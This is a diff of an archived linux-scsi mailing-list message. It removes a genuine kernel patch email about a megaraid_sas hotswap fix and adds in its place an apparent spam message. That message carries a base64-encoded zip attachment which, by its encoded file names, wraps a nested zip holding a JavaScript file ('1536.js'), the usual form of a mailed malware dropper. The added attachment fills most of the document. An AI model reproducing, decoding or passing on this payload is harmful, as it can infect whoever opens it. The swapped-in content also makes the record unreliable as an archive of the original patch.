@@ -1,56 +1,104 @@
-From: Zhou Zhengping <johnzzpcrystal@gmail.com>
-Subject: [PATCH]scsi: megaraid_sas: fix raid card hotswap failure
-Date: Sun, 30 Apr 2017 02:11:11 +0800
-Message-ID: <1493489471-4848-1-git-send-email-johnzzpcrystal@gmail.com>
-References: <1493372584-1204-1-git-send-email-johnzzpcrystal@gmail.com>
+From: <junplzen@cmkos.cz>
+Subject: 37864 linux-scsi
+Date: Sat, 29 Apr 2017 23:51:36 -0000
+Message-ID: <149350989625.14993.3161687327764039594@vnpt.vn>
+Mime-Version: 1.0
+Content-Type: application/zip; name="62397.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mail-pf0-f194.google.com ([209.85.192.194]:36857 "EHLO
-        mail-pf0-f194.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S967719AbdD2SML (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Sat, 29 Apr 2017 14:12:11 -0400
-Received: by mail-pf0-f194.google.com with SMTP id v14so22146757pfd.3
-        for <linux-scsi@vger.kernel.org>; Sat, 29 Apr 2017 11:12:10 -0700 (PDT)
-In-Reply-To: <1493372584-1204-1-git-send-email-johnzzpcrystal@gmail.com>
+Received: from [117.253.50.149] ([117.253.50.149]:56209 "HELO vnpt.vn"
+        rhost-flags-FAIL-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751957AbdD2Xvp (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Sat, 29 Apr 2017 19:51:45 -0400
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
 To: linux-scsi@vger.kernel.org
-Cc: hare@suse.de, James.Bottomley@hansenpartnership.com, Zhou Zhengping <johnzzpcrystal@gmail.com>
 
-    When a scsi_device is unpluged from scsi controller, if the
-scsi_device is still be used by application layer,it won't be
-released until users release it. In this case, scsi_device_remove just
-set the scsi_device's state to be SDEV_DEL. But if you plug the disk
-just before the old scsi_device is released, then there will be two
-scsi_device structures in scsi_host->__devices. when the next unpluging
-event happens,some low-level drivers will check whether the scsi_device
-has been added to host (for example, the megaraid sas series controller)
-by calling scsi_device_lookup(call __scsi_device_lookup) in function
-megasas_aen_polling.__scsi_device_lookup will return the first scsi_device.
-Because its state is SDEV_DEL, the scsi_device_lookup will return NULL
-finally, making the low-level driver assume that the scsi_device has been
-removed,and won't call scsi_device_remove,which will lead the
-failure of hot swap.
-
-Signed-off-by: Zhou Zhengping <johnzzpcrystal@gmail.com>
-Tested-and-reported-by: Zeng Rujia <ZengRujia@sangfor.com.cn>
-Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=195607
-Reviewed-by: Hannes Reinecke <hare@suse.com>
----
- drivers/scsi/scsi.c | 2 ++
- 1 file changed, 2 insertions(+)
-
-diff --git a/drivers/scsi/scsi.c b/drivers/scsi/scsi.c
-index 7bfbcfa..61cdd99 100644
---- a/drivers/scsi/scsi.c
-+++ b/drivers/scsi/scsi.c
-@@ -763,6 +763,8 @@ struct scsi_device *__scsi_device_lookup(struct Scsi_Host *shost,
- 	struct scsi_device *sdev;
- 
- 	list_for_each_entry(sdev, &shost->__devices, siblings) {
-+		if (sdev->sdev_state == SDEV_DEL)
-+			continue;
- 		if (sdev->channel == channel && sdev->id == id &&
- 				sdev->lun ==lun)
- 			return sdev;
--- 
-1.8.3.1
+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
+vBIAAAAA
